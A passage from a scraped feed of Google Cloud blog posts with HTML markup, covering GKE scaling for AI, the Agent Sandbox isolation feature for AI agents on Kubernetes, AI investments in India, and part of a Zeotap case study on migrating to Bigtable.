AI gigawatt era</strong></h3>\n<p><span style=\"vertical-align: baseline;\">In this \u2018Gigawatt AI era,\u2019 foundational model creators are driving demand for unprecedented computational power. Based on internal testing of our experimental-mode stack, we are excited to share that we used GKE to create the largest known Kubernetes cluster, with 130,000 nodes.</span></p>\n<p><span style=\"vertical-align: baseline;\">At Google Cloud, we\u2019re also focusing on single-cluster scalability for tightly coupled jobs, developing multi-cluster orchestration capabilities for job sharding (e.g., </span><a href=\"https://kueue.sigs.k8s.io/docs/concepts/multikueue/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MultiKueue</span></a><span style=\"vertical-align: baseline;\">), and designing new approaches for dynamic capacity reallocation \u2014 all while extending open-source Kubernetes APIs to simplify AI platform development and scaling. We are heavily investing into the open-source ecosystem of tools behind AI at scale (e.g. </span><a href=\"https://kueue.sigs.k8s.io/docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Kueue</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://github.com/kubernetes-sigs/jobset\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">JobSet</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://github.com/etcd-io/etcd\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">etcd</span></a><span style=\"vertical-align: baseline;\">), while making GKE-specific integrations to our data centers to offer the best performance and reliability (e.g., running the GKE control plane on Spanner). Finally, we\u2019re excited to open-source our </span><span style=\"vertical-align: baseline;\">Multi-Tier Checkpointing (MTC) solution, designed to improve the efficiency of large-scale AI training jobs by reducing lost time associated with hardware failures and slow recovery from saved checkpoints.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Better compute for every workload</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our decade-long commitment to Kubernetes is rooted in making it more accessible and efficient for every workload. However, through the years, one key challenge has remained: when using autoscaling, provisioning new nodes took several minutes \u2014 not fast enough for high-volume, fast-scale applications. This year, we addressed this friction head-on, with a variety of enhancements in support of our mission: to provide near-real-time scalable compute capacity precisely when you need it, all while optimizing price and performance.\u00a0</span></p>\n<p><strong style=\"vertical-align: baseline;\">Autopilot for everyone</strong></p>\n<p><span style=\"vertical-align: baseline;\">We introduced the </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/container-optimized-compute-delivers-autoscaling-for-autopilot?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">container-optimized compute platform</span></a><span style=\"vertical-align: baseline;\"> \u2014 a completely reimagined autoscaling stack for GKE Autopilot. As the recommended mode of operation, Autopilot fully automates your node infrastructure management and scaling, with dramatic performance and cost implications.\u00a0 As Jia Li, co-founder at LiveX AI shared, \"LiveX AI achieves over 50% lower TCO, 25% faster time-to-market, and 66% lower operational cost with GKE Autopilot.\u201d And with the recent GA of </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/gke-autopilot-now-available-to-all-qualifying-clusters?e=4875480\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Autopilot compute classes for Standard clusters</span></a><span style=\"vertical-align: baseline;\">, we made this hands-off experience accessible to more developers, allowing you to adopt Autopilot on a per-workload basis.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Tackling provisioning latency from every angle</strong></p>\n<p><span style=\"vertical-align: baseline;\">We introduced </span><strong style=\"vertical-align: baseline;\">faster concurrent node pool auto-provisioning</strong><span style=\"vertical-align: baseline;\">, making operations asynchronous and highly parallelized. This simple change dramatically accelerates cluster scaling for heterogeneous workloads, improving deployment latency many times over in our benchmarks. Then, for demanding scale-up needs, the new </span><a href=\"https://github.com/kubernetes/autoscaler/pull/8151/commits/0ffe04d1136f50eed0be6cd7910701bf3bacedcb?short_path=8ea88c4\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Buffers API (OSS)</span></a><span style=\"vertical-align: baseline;\"> allows you to request a buffer of pre-provisioned, ready-to-use nodes, making compute capacity available almost instantaneously. And once the node is ready, the new version of </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/improving-gke-container-image-streaming-for-faster-app-startup?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE container image streaming</span></a><span style=\"vertical-align: baseline;\"> gets your applications running faster by allowing them to start </span><span style=\"font-style: italic; vertical-align: baseline;\">before</span><span style=\"vertical-align: baseline;\"> the entire container image is downloaded, a critical boost for large AI/ML and data-processing workloads.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Non-disruptive autoscaling to improve resource utilization</strong></p>\n<p><span style=\"vertical-align: baseline;\">The quest for speed extends to workload-level scaling.\u00a0</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/horizontal-pod-autoscaling#hpa-profile\"><span style=\"text-decoration: underline; vertical-align: baseline;\">HPA Performance Profile is now enabled by default</span></a><span style=\"vertical-align: baseline;\"> on new GKE Standard clusters. This brings massive scaling improvements \u2014 including support for up to 5,000 HPA objects and parallel processing \u2014 for faster, more consistent horizontal scaling.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">We're tackling disruptions in vertical scaling with the preview of </span><a href=\"https://github.com/kubernetes/autoscaler/tree/master/vertical-pod-autoscaler/enhancements/4016-in-place-updates-support\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VPA with in-place pod resize</span></a><span style=\"vertical-align: baseline;\">, which allows GKE to automatically resize CPU and memory requests for your containers, often without needing to recreate the pod.\u00a0</span></p>\n</li>\n</ol>\n<p><strong style=\"vertical-align: baseline;\">Dynamic hardware efficiency</strong></p>\n<p><span style=\"vertical-align: baseline;\">Finally, our commitment to dynamic efficiency extends to hardware utilization. GKE users now have access to:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">New </span><strong style=\"vertical-align: baseline;\">N4A VMs</strong><span style=\"vertical-align: baseline;\"> based on Google Axion Processors (</span><a href=\"https://cloud.google.com/blog/products/compute/axion-based-n4a-vms-now-in-preview?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">now in preview</span></a><span style=\"vertical-align: baseline;\">) and </span><strong style=\"vertical-align: baseline;\">N4D VMs</strong><span style=\"vertical-align: baseline;\"> based on 5th Gen AMD EPYC Processors (</span><a href=\"https://cloud.google.com/blog/products/compute/n4d-vms-based-on-amd-turin-now-ga\"><span style=\"text-decoration: underline; vertical-align: baseline;\">now GA</span></a><span style=\"vertical-align: baseline;\">). Both support Custom Machine Types (CMT), letting you create right-sized nodes that are matched to your workloads.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">New </span><a href=\"https://cloud.google.com/blog/products/compute/adopt-new-vm-series-with-gke-compute-classes-flexible-cuds?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE custom compute classes</span></a><span style=\"vertical-align: baseline;\">, allowing you to define a prioritized list of VM instance types, so your workloads automatically use the newest, most price-performant options with no manual intervention.\u00a0</span></p>\n</li>\n</ol>\n<h3><strong style=\"vertical-align: baseline;\">A platform to power AI Inference</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The true challenge of generative AI inference is how to serve billions of tokens reliably, at lightning speed, and without bankrupting the organization?\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Unlike web applications, serving LLMs is both stateful and computationally intensive. </span><span style=\"vertical-align: baseline;\">To address this we have driven extensive open-source investments to Kubernetes including the </span><a href=\"https://github.com/kubernetes-sigs/gateway-api-inference-extension\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gateway API Inference Extension</span></a><span style=\"vertical-align: baseline;\"> for LLM-aware routing, the </span><a href=\"https://github.com/kubernetes-sigs/inference-perf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">inference performance project</span></a><span style=\"vertical-align: baseline;\">, providing a benchmarking standard for meticulous model performance insights on accelerators and HPA scaling metrics and thresholds, and </span><a href=\"https://kubernetes.io/docs/concepts/scheduling-eviction/dynamic-resource-allocation/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dynamic Resource Allocation</span></a><span style=\"vertical-align: baseline;\"> (developed in collaboration with Intel and others) to streamline and automate the allocation and scheduling of GPUs, TPUs, and other devices to pods and workloads within Kubernetes. And we formed the </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/enhancing-vllm-for-distributed-inference-with-llm-d?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">llm-d project</span></a><span style=\"vertical-align: baseline;\"> with Red Hat and IBM to create a Kubernetes-native distributed inference stack that optimizes for the \u201ctime to reach SOTA architectures.\u201d\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">On the GKE side we recently announced the </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/gke-inference-gateway-and-quickstart-are-ga?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">general availability of GKE Inference Gateway</span></a><span style=\"vertical-align: baseline;\">, a Kubernetes-native solution for serving AI workloads. It is available with two workload-specific optimizations:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">LLM-aware routing</strong><span style=\"vertical-align: baseline;\"> for applications like multi-turn chat, which routes requests to the same accelerators to use cached context, avoiding latency spikes</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Disaggregated serving</strong><span style=\"vertical-align: baseline;\">, which separates the \"prefill\" (prompt processing) and \"decode\" (token generation) stages onto separate, optimized machine pools\u00a0</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">As a result, GKE Inference Gateway now achieves up to 96% lower Time-to-First-Token (TTFT) latency and up to 25% lower token costs at peak throughput when compared to other managed Kubernetes services.</span></p>\n<p><span style=\"vertical-align: baseline;\">Startup latency for AI inference servers is a consistent challenge with large models taking 10s of minutes to start. Today, we\u2019re introducing </span><strong style=\"vertical-align: baseline;\">GKE Pod Snapshots</strong><span style=\"vertical-align: baseline;\"> which drastically improves startup latency by enabling CPU and GPU workloads to be restored from a memory snapshot.\u00a0 GKE Pod Snapshots reduces AI inference start-up by as much as 80%, loading 70B parameter models in just 80 seconds and 8B parameters models in just 16 seconds.</span></p>\n<p><span style=\"vertical-align: baseline;\">No discussion of inference is complete without talking about </span><span style=\"vertical-align: baseline;\">the complexity, cost, and difficulty of deploying production-grade AI infrastructure. GKE Inference Quickstart provides a continuous, automated benchmarking system kept up to date with the latest accelerators in Google Cloud, the latest open models, and inference software. You can use these benchmarked profiles to save significant time qualifying, configuring, deploying, as well as monitoring</span><span style=\"vertical-align: baseline;\"> inference-specific performance metrics and dynamically fine-tuning your deployment. You can find this data in </span><a href=\"https://colab.sandbox.google.com/github/GoogleCloudPlatform/kubernetes-engine-samples/blob/main/ai-ml/notebooks/giq_visualizations.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this colab notebook</span></a><span style=\"vertical-align: baseline;\">.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Here\u2019s to the next decade of Kubernetes and GKE</strong></h3>\n<p><span style=\"vertical-align: baseline;\">\u00a0As GKE celebrates a decade of foundational work, we at Google are proud to help lead the future, and we know it can only be built together. Kubernetes would not be where it is today without the efforts of its contributor community. That includes everyone from members writing foundational new features to those doing the essential, daily work \u2014 the \"chopping wood and carrying water\" \u2014 that keeps the project thriving.</span></p>\n<p><span style=\"vertical-align: baseline;\">We invite you to explore new capabilities, learn more about exciting announcements such as Ironwood TPUs, attend our deep-dive sessions, and join us in shaping the future of open-source infrastructure.</span></p></div>",
        "published_date": "2025-11-11 12:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/agentic-ai-on-kubernetes-and-gke/",
        "title": "Introducing Agent Sandbox: Strong guardrails for agentic AI on Kubernetes and GKE",
        "thumbnail": null,
        "author": "Brandon Royal",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Google and the cloud-native community have consistently strengthened Kubernetes to support modern applications. At KubeCon EU 2025 earlier this year, </span><span style=\"vertical-align: baseline;\">we announced a series of enhancements</span><span style=\"vertical-align: baseline;\"> to Kubernetes </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/google-bytedance-and-red-hat-improve-ai-on-kubernetes?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">to better support AI inference</span></a><span style=\"vertical-align: baseline;\">. Today, at KubeCon NA 2025, we\u2019re focused on making Kubernetes the most open and scalable platform for AI agents, with the introduction of </span><strong style=\"vertical-align: baseline;\">Agent Sandbox</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Consider the challenge that AI agents represent. AI agents help applications go from answering simple queries to performing complex, multi-step tasks to achieve the users objective. Provided a request like \u201cvisualize last quarters sales data\u201d, the agent has to use one tool to query the data and another to process that data into a graph and return to the user.\u00a0 Where traditional software is predictable, AI agents can make their own decisions about when and how to use tools at their disposal to achieve a user's objective, including generating code, using computer terminals and even browsers.</span></p>\n<p><span style=\"vertical-align: baseline;\">Without strong security and operational guardrails, orchestrating powerful, non-deterministic agents can introduce significant risks. Providing kernel-level isolation for agents that execute code and commands is non-negotiable. AI and agent-based workloads also have additional infrastructure needs compared to traditional applications. Most notably, they need to orchestrate thousands of sandboxes as ephemeral environments, rapidly creating and deleting them as needed while ensuring they have limited network access.\u00a0\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">With its maturity, security, and scalability, we believe Kubernetes provides the most suitable foundation for running AI agents. Yet it still needs to evolve to meet the needs of agent code execution and computer use scenarios. Agent Sandbox is a powerful first step in that direction.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Strong isolation at scale</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Agentic code execution and computer use require an isolated sandbox to be provisioned for each task. Further, users expect infrastructure to keep pace even as thousands of sandboxes are scheduled in parallel.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">At its core, </span><span style=\"vertical-align: baseline;\">Agent Sandbox is a new Kubernetes primitive built with the Kubernetes community that\u2019s designed specifically for agent code execution and computer use, delivering the performance and scale needed for the next generation of agentic AI workloads. Foundationally built on gVisor with additional support for Kata Containers for runtime isolation, Agent Sandbox provides a secure boundary to reduce the risk of vulnerabilities that could lead to data loss, exfiltration or damage to production systems. We\u2019re continuing our commitment to open source, building Agent Sandbox as a Cloud Native Computing Foundation (CNCF) project in the Kubernetes community. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_K1VZDUQ.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Enhanced performance on GKE</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At the same time, you need to optimize performance as you scale your agents to deliver the best agent user-experience at the lowest cost. When you use Agent Sandbox on Google Kubernetes Engine (GKE), you can leverage managed gVisor in </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/concepts/sandbox-pods\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Sandbox</span></a><span style=\"vertical-align: baseline;\"> and the </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/container-optimized-compute-delivers-autoscaling-for-autopilot?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">container-optimized compute platform</span></a><span style=\"vertical-align: baseline;\"> to horizontally scale your sandboxes faster. Agent Sandbox also enables low-latency sandbox execution by enabling administrators to configure pre-warmed pools of sandboxes. With this feature, Agent Sandbox delivers sub-second latency for fully isolated agent workloads, up to a 90% improvement over cold starts.</span></p>\n<p><span style=\"vertical-align: baseline;\">The same isolation property that makes a sandbox safe, makes it more susceptible to compute underutilization. Reinitializing each sandbox environment with a script can be brittle and slow, and idle sandboxes often waste valuable compute cycles. In a perfect world, you could take a snapshot of running sandbox environments to start them from a specific state.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Pod Snapshots</strong><span style=\"vertical-align: baseline;\"> is a new, GKE-exclusive feature that enables full checkpoint and restore of running pods. Pod Snapshots drastically reduces startup latency of agent and AI workloads. When combined with Agent Sandbox, Pod Snapshots lets teams provision sandbox environments from snapshots, so they can start up in seconds. GKE Pod Snapshots supports snapshot and restore of both CPU- and GPU-based workloads, bringing pod start times from minutes down to seconds. With Pod Snapshots, any idle sandbox can be snapshotted and suspended, saving significant compute cycles with little to no disruption for end-users.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_NJWlanH.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Built for AI engineers</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Teams building today\u2019s agentic AI or reinforcement learning (RL) systems should not have to be infrastructure experts. We built Agent Sandbox with AI engineers in mind, designing an API and Python SDK that lets them manage the lifecycle of their sandboxes, without worrying about the underlying infrastructure.\u00a0 </span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;from agentic_sandbox import Sandbox\\r\\n\\r\\n# The SDK abstracts all YAML into a simple context manager \\r\\nwith Sandbox(template_name=&quot;python3-template&quot;,namespace=&quot;ai-agents&quot;) as sandbox:\\r\\n\\r\\n   # Execute a command inside the sandbox\\r\\n   result = sandbox.run(&quot;print(\\&#x27;Hello from inside the sandbox!\\&#x27;)&quot;)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f93af942c40&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This separation of concern enables both an AI developer-friendly experience and the operational control and extensibility that Kubernetes administrators and operators expect.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Agentic AI represents a profound shift for software development and infrastructure teams. Agent Sandbox and GKE can help\u00a0 deliver the isolation and performance your agents need. </span><span style=\"vertical-align: baseline;\">Agent Sandbox is available in open source and can be </span><span style=\"vertical-align: baseline;\">deployed on GKE today</span><span style=\"vertical-align: baseline;\">. GKE Pod Snapshots is available in limited preview and will be available to all GKE customers later this year. To get started, check out the Agent Sandbox </span><a href=\"https://agent-sandbox.sigs.k8s.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\">\u00a0 and </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/how-to/agent-sandbox\"><span style=\"text-decoration: underline; vertical-align: baseline;\">quick start</span></a><span style=\"vertical-align: baseline;\">. We are excited to see what you build!</span></p></div>",
        "published_date": "2025-11-11 12:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/gcp/supporting-viksit-bharat-announcing-ai-investments-in-india/",
        "title": "Supporting Viksit Bharat: Announcing our newest AI investments in India",
        "thumbnail": null,
        "author": "Saurabh Tiwary",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">India\u2019s developer community, vibrant startup ecosystem, and leading enterprises are embracing AI with incredible speed. To meet this moment for India, we are investing in powerful, locally-available tools in India that can help foster a diverse ecosystem, and ensure our platform delivers the controls you need for compliance and AI sovereignty.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we\u2019re announcing a significant expansion of our local AI hardware capacity for customers in India. This increase in local compute, powered by Google's </span><a href=\"https://cloud.google.com/blog/products/compute/in-q3-2025-ai-hypercomputer-adds-vllm-tpu-and-more\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Hypercomputer architecture</span></a><span style=\"vertical-align: baseline;\"> with the latest Trillium TPUs, will help more businesses and public sector organizations train and serve their most advanced Gemini models in India.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">By unblocking new opportunities for high-performance, low-latency AI applications we can help customers meet India\u2019s data residency and sovereignty requirements.</span></p>\n<h3 style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Enabling models and control: AI tools built for India's context</strong></h3>\n<p><span style=\"vertical-align: baseline;\">While infrastructure is the foundation for digital sovereignty, it also requires control over the data and the models built on it. We\u2019re committed to bringing our latest AI advancements to India faster than ever, with the controls you need.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our new services would enable you to build, tune, and deploy models that understand India's unique business logic and rich cultural context.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Next-generation models, here in India</strong><span style=\"vertical-align: baseline;\">: Earlier this year, Google Cloud made Gemini available to regulated Indian customers by deploying Gemini 2.5 Flash with local machine-learning processing support. Now, we\u2019re opening early testing for our latest and most advanced Gemini models to Indian customers. We\u2019re also committing to launching the most powerful Gemini models in India with full data residency support. This is a first for Google Cloud, and a direct response to help meet the needs of our Indian customers.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">More AI capabilities, available locally</strong><span style=\"vertical-align: baseline;\">: We\u2019re providing additional consumption models and pre-built AI-powered applications tailored for local context by launching a suite of new capabilities with data residency support in India:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Batch support for Gemini 2.5 Flash</strong><span style=\"vertical-align: baseline;\">: Now generally available, this allows organizations to run high-volume, non-real-time AI tasks at a lower cost, all in India.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Document AI</strong><span style=\"vertical-align: baseline;\">: Now in preview, we\u2019re providing local support to help Indian businesses automate document processing.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">More local context in your AI</strong><span style=\"vertical-align: baseline;\">: </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/grounding/grounding-with-google-maps\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Grounding on Google Maps</span></a><span style=\"vertical-align: baseline;\"> is a new capability to ground model responses in real time from Google Maps, ensuring AI applications can provide accurate, location-aware answers.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">A sovereign AI ecosystem: Building for India, with India</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The most durable and decisive factor for long-term digital sovereignty lies in cultivating the \"human element\" \u2014 the skilled talent and innovation ecosystem. A sovereign AI future depends on building a strong local ecosystem.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our strategy is to support India\u2019s ecosystem-led approach by investing in the researchers, developers, and startups who are building for India's specific needs.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Collaboration with IIT Madras</strong><span style=\"vertical-align: baseline;\">: Google Cloud and Google DeepMind are thrilled to collaborate with IIT Madras to support the launch of </span><a href=\"https://arena.ai4bharat.org/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Indic Arena</span></a><span style=\"vertical-align: baseline;\">. Run independently by the renowned AI4Bharat center at IIT Madras, this platform will allow users from all over India to anonymously evaluate and rank AI models on tasks unique to India's rich multilingual landscape. To support this initiative, we are providing cloud credits to power this critical, community-driven resource.</span></p>\n<p><span style=\"vertical-align: baseline;\">\"At AI4Bharat, our mission is to build AI for India's specific needs. A critical part of this is having a neutral, standardized benchmark to understand how models are performing across our many languages,\u201d said Mitesh Khapra, associate professor, IIT Madras. \u201cIndic Arena will be that platform. We are delighted to have Google Cloud's support to provide the initial compute power to bring this independent, public-facing project to life for the entire Indian AI community.\"</span></p>\n<p><span style=\"vertical-align: baseline;\">We encourage all developers, researchers, and organizations in India to explore the </span><a href=\"https://arena.ai4bharat.org/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Indic Arena platform</span></a><span style=\"vertical-align: baseline;\"> and contribute to building a more inclusive AI future.</span></p>\n<p><span style=\"vertical-align: baseline;\">We invite the entire Indian ecosystem, from startups and universities to government bodies and enterprises, to take advantage of this new, dedicated capacity for Gemini in </span><a href=\"https://cloud.google.com/vertex-ai?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\"> and our sovereign-ready infrastructure to build the next generation of AI that is built by Indians, for Indians.</span></p></div>",
        "published_date": "2025-11-11 03:30:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/zeotap-migrates-from-scylladb-to-bigtable/",
        "title": "Zeotap's big win: 46% TCO reduction and enhanced real-time performance with Bigtable",
        "thumbnail": null,
        "author": "Sathish KS",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In today\u2019s fast-paced, data-driven landscape, the ability to process, analyze, and act on vast amounts of data in real time is paramount. For businesses aiming to deliver personalized customer experiences and optimize operations, the choice of database technology is a critical decision.</span></p>\n<p><span style=\"vertical-align: baseline;\">At Zeotap \u2014 a leading Customer Data Platform (CDP) \u2014 we empower enterprises to unify their data from disparate sources to build a comprehensive, unified view of their customers. This enables businesses to activate data across various channels for marketing, customer support, and analytics. Zeotap handles more than 10 billion new data points a day from more than 500 data sources across our clients, while orchestrating through more than 2000 workflows \u2014 one-third of those in real time with milliseconds latency. To meet stringent SLAs for data freshness and end-to-end latencies, performance is crucial.</span></p>\n<p><span style=\"vertical-align: baseline;\">However, as Zeotap grew, our ScyllaDB-based infrastructure faced scaling challenges, especially as the business needed to evolve towards real-time use cases and increasingly spiky workloads. We needed a more flexible, performant, cost-effective, and operationally efficient solution, which led us to </span><a href=\"https://cloud.google.com/bigtable\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bigtable</span></a><span style=\"vertical-align: baseline;\">, a low-latency, NoSQL database service from Google Cloud for machine learning, operational analytics, and high-throughput applications. The migration resulted in significant benefits, including a 46% reduction in Total Cost of Ownership (TCO).</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The challenge of scaling real-time analytics</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Zeotap's platform demands a database capable of handling a high write throughput of over 300,000 writes per second and nearly triple that in reads during peaks.</span></p>\n<p><span style=\"vertical-align: baseline;\">As our platform evolved, the initial architecture presented several hurdles:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scalability limitations:</strong><span style=\"vertical-align: baseline;\"> We initially self-managed ScyllaDB, on-prem, and later on in the cloud. We use Spark and BigQuery for analytical batch processing, but managing these different tools and pipelines across our own environment and customer environments reached a peak where scaling became increasingly harder.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Operational overhead:</strong><span style=\"vertical-align: baseline;\"> Managing and scaling our previous database infrastructure required significant operational effort. We had to run scripts in the background to add nodes when resource alerts came up and had to map hardware to different kinds of workloads.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deployment complexity:</strong><span style=\"vertical-align: baseline;\"> Embedding third-party technology in our stack complicated deployment. The commercial procurement process was also cumbersome.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cost predictability:</strong><span style=\"vertical-align: baseline;\"> Ensuring predictable costs for us and our clients was a growing concern as our business grew.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">These challenges drove us to re-evaluate our data infrastructure and seek a cloud-native solution that could meet our streaming first, \u201czero-touch\u201d ops philosophy, while supporting our demanding OLAP and OLTP workloads.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Why Bigtable? Performance, scalability, and efficiency</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Zeotap's decision to migrate to Bigtable was driven by four key requirements:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Operational simplicity:</strong><span style=\"vertical-align: baseline;\"> Moving from ScyllaDB cluster to Bigtable meant eliminating a significant operational burden and achieving \"zero-touch ops\". Bigtable abstracts away hardware mapping and node management. This eliminates the need for maintenance windows and helps ensure data rebalancing.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Performance:</strong><span style=\"vertical-align: baseline;\"> Zeotap needed predictable performance, even in the face of regularly 